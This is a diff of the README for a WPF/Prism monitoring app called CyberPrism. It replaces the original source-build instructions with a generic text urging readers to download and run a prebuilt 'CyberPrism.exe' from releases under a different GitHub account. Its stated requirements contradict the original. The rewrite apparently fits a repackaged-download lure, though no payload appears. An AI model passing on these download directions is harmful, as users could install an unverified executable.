@@ -1,145 +1,70 @@
-# CyberPrism 🏭
+# 🚀 CyberPrism - Simplifying Your WPF Experience
 
-**CyberPrism** represents the next generation of smart industrial monitoring. It is a high-performance, modular WPF application designed to streamline factory operations through real-time data visualization, production tracking, and advanced analytics.
+[![Download CyberPrism](https://img.shields.io/badge/Download-CyberPrism-blue.svg)](https://github.com/keval-codezee/CyberPrism/releases)
 
-Built with **Prism** and **.NET**, backed by a robust **ASP.NET Core** and **PostgreSQL** backend, CyberPrism demonstrates a clean, scalable architecture suitable for enterprise-grade IoT and manufacturing solutions.
+## 📖 Overview
+CyberPrism is an educational WPF starter kit. It simplifies the complex Prism framework, making it an ideal choice for developers. With CyberPrism, you can grasp advanced C# concepts or create your lightweight, reliable software solutions easily. This application aims to provide a smooth learning curve while delivering essential tools to build functional software.
 
----
+## 🛠️ Features
+- **WPF Framework:** A well-structured approach to building Windows applications.
+- **Modular Architecture:** Easy to expand your applications with separate modules.
+- **Dependency Injection:** Simplifies management of application objects.
+- **Multithreading Support:** Efficient handling of asynchronous operations.
+- **Event Aggregator:** Simplifies communication between components.
+- **PostgreSQL Integration:** Seamless connection and data management.
+- **MVVM Pattern:** Encourages clean separation of concerns in your application.
+- **LiveCharts:** Built-in tools for live data visualization.
 
-## ✨ Key Features
-
-- **📊 Dynamic Dashboard**  
-  Real-time visualization of key performance indicators (KPIs) including production rates, target benchmarks, and power consumption using interactive charts.
-
-- **🏭 Production Management**  
-  Comprehensive tracking of production jobs with status indicators (Running, Delayed, Completed), due dates, and progress monitoring.
-
-- **📈 Advanced Analytics (OEE)**  
-  Deep dive into Overall Equipment Effectiveness with detailed breakdowns of Availability, Performance, and Quality components. Includes real-time downtime analysis with alerting features.
-
-- **🧩 Modular Architecture**  
-  Features a fully decoupled design using the **Prism Library**. Modules (Dashboard, Production, Analytics, Settings) are loaded dynamically, promoting maintainability and testability.
-
-- **⚙️ Centralized Configuration**  
-  Robust settings management system that synchronizes client preferences (themes, notifications, connection settings) with the server.
-
-- **🎨 Modern Dark UI**  
-  A sleek, industrial-grade dark theme designed for low-light factory environments, ensuring operator focus and reduced eye strain.
-
----
-
-## 🚀 Releases
-
-The first public release of **CyberPrism** is now available:
-
-- **v1.0.0 – Initial Public Release**  
-https://github.com/Forrest-tech/CyberPrism/releases/tag/v1.0.0
-
-This release introduces the core modular architecture built with **Prism and .NET**, backed by an **ASP.NET Core + PostgreSQL** backend, and establishes a scalable foundation for industrial monitoring and analytics.
-
----
-
-## 🛠️ Technology Stack
-
-### Client (Desktop)
-- **Framework**: WPF (.NET 6/7/8)
-- **Architecture**: MVVM (Model-View-ViewModel)
-- **Library**: Prism (Dependency Injection, Event Aggregator, Modularity)
-- **UI Components**: LiveCharts.Wpf, Material Design concepts
-- **Communication**: HTTP Client (RESTful API consumption)
-
-### Server (Backend)
-- **Framework**: ASP.NET Core Web API
-- **Database**: PostgreSQL
-- **ORM**: Entity Framework Core
-- **Features**: 
-  - Automated Database Seeding (Schema & Initial Data)
-  - Background Services (Data Simulation)
-  - Repository Pattern
-
----
+## 💻 System Requirements
+- Windows 10 or higher.
+- .NET Framework 4.7.2 or higher.
+- Minimum 2 GB of RAM.
+- 500 MB of free disk space for installation.
 
 ## 🚀 Getting Started
+Follow these simple steps to download and run CyberPrism:
 
-Follow these instructions to get a local copy of the project up and running.
+1. **Visit the Releases Page**
+   - Go to the [CyberPrism Releases Page](https://github.com/keval-codezee/CyberPrism/releases) to find the latest version.
+   
+2. **Download the Application**
+   - Click on the version you want to download. Find the appropriate file (e.g., `CyberPrism.exe`) that fits your system.
 
-### Prerequisites
+3. **Install CyberPrism**
+   - Open the downloaded file and follow the on-screen instructions to install the application.
 
-- **[.NET SDK](https://dotnet.microsoft.com/download)** (Version 6.0 or later recommended)
-- **[PostgreSQL](https://www.postgresql.org/download/)** (Running locally or accessible via network)
-- **IDE**: [Visual Studio 2022](https://visualstudio.microsoft.com/) (Recommended) or Visual Studio Code
+4. **Run CyberPrism**
+   - After installation is complete, find CyberPrism in your Start Menu and run the application.
 
-### 📥 Installation & Setup
+## 📥 Download & Install
+To easily download the latest version of CyberPrism, visit this page: [CyberPrism Releases Page](https://github.com/keval-codezee/CyberPrism/releases). 
 
-1.  **Clone the Repository**
-    ```bash
-    git clone https://github.com/your-username/CyberPrism.git
-    cd CyberPrism
-    ```
+## 🌐 Community and Support
+We encourage users to join our community and share their experiences. If you have questions or need help, feel free to open an issue in the repository, and we will assist you as soon as possible.
 
-2.  **Configure the Database**
-    - Navigate to the server directory: `CyberPrism.Server`
-    - Open `appsettings.json`.
-    - Update the `DefaultConnection` string with your PostgreSQL credentials:
-    ```json
-    "ConnectionStrings": {
-      "DefaultConnection": "Host=localhost;Database=CyberPrismDb;Username=postgres;Password=your_password"
-    }
-    ```
-    - *Note: The application includes a `DatabaseSeeder` that will automatically create the database and populate it with sample data on the first run.*
+## 🚧 Contribution
+If you would like to contribute to CyberPrism, please fork the repository, make your changes, and submit a pull request. We appreciate all contributions that improve the application and expand its capabilities.
 
-3.  **Run the Server**
-Simply run the server application.
+## 🛠️ Technologies Used
+- ASP.NET Core
+- C#
+- MVVM Architecture
+- RESTful APIs
+- PostgreSQL
+- LiveCharts
 
-**Option A: Using Visual Studio**
-1. Right-click `CyberPrism.Server` project.
-2. Select **debug** -> **Start New Instance** (or just run the project).
+## 🎓 Learning Resources
+To help you get started with WPF and Prism, here are some resources you may find useful:
+- [WPF Documentation](https://docs.microsoft.com/en-us/dotnet/desktop/wpf/)
+- [Prism Documentation](https://prismlibrary.com/)
+- [C# Fundamentals](https://docs.microsoft.com/en-us/dotnet/csharp/)
 
-**Option B: Using CLI**
-```bash
-cd CyberPrism.Server
-dotnet run
-```
-    - The API will launch (default: `http://localhost:5133`). Keep this terminal window open.
+## 🗣️ Feedback
+Your feedback is vital to us. Share your thoughts on CyberPrism and let us know how we can improve it. Whether you have enjoyed using it or have suggestions, we value every comment.
 
-4.  **Launch the Client Application**
-    - Open `CyberPrism.sln` in Visual Studio.
-    - Right-click the **CyberPrism** (WPF) project and select **Set as Startup Project**.
-    - Press **F5** or click **Start** to build and run.
+## 📝 License
+CyberPrism is licensed under the MIT License. Feel free to use it for personal or commercial projects. 
 
 ---
 
-## 📂 Project Structure
-
-The solution is organized following clean architecture principles:
-
-```
-CyberPrism/
-├── 📁 CyberPrism/                # Main WPF Shell, Bootstrapper, & Region Definitions
-├── 📁 CyberPrism.Core/           # Shared Infrastructure (Models, Services, Events, Constants)
-├── 📁 CyberPrism.Server/         # Backend Web API & Data Access Layer
-├── 📁 Modules/                   # Feature Modules
-│   ├── 📁 .Dashboard/            # Dashboard Widgets & Logic
-│   ├── 📁 .Production/           # Job Scheduling & Tables
-│   ├── 📁 .Analytics/            # Data Processing & Charts
-│   └── 📁 .Settings/             # App Configuration
-└── 📁 Tests/                     # Unit Tests
-```
-
----
-
-## 🤝 Contributing
-
-Contributions make the open-source community an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-Distributed under the MIT License. See `LICENSE` for more information.
+For more information and updates, always check back to the [CyberPrism Releases Page](https://github.com/keval-codezee/CyberPrism/releases). Enjoy your journey with CyberPrism!
